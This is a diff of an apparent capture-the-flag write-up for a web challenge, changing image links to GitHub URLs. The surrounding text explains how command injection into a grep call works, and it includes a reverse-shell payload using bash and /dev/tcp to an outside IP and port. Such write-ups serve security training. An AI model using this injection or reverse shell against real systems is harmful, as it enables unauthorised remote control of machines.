@@ -108,9 +108,9 @@ grep -R -i [USER_INPUT] /var/www/html/data/printer_drivers.txt
 - Which gives us the opportunity to put a semicolon and terminate the command early, then running our own!
 - So by running a test cmd we can confirm RCE
 
-![[Pasted image 20251102112110.png]]
+![Test Command](https://raw.githubusercontent.com/j0hn-G4lt/huntressCTF-2025/main/Images/Pasted%20image%2020251102112110.png)
 
-![[Pasted image 20251102112119.png]]
+![RCE Confirmed](https://raw.githubusercontent.com/j0hn-G4lt/huntressCTF-2025/main/Images/Pasted%20image%2020251102112119.png)
 
 - We can gain access to the machine via revshell command
 - `;bash -c "sh -i >& /dev/tcp/10.200.11.67/6969 0>&1";`
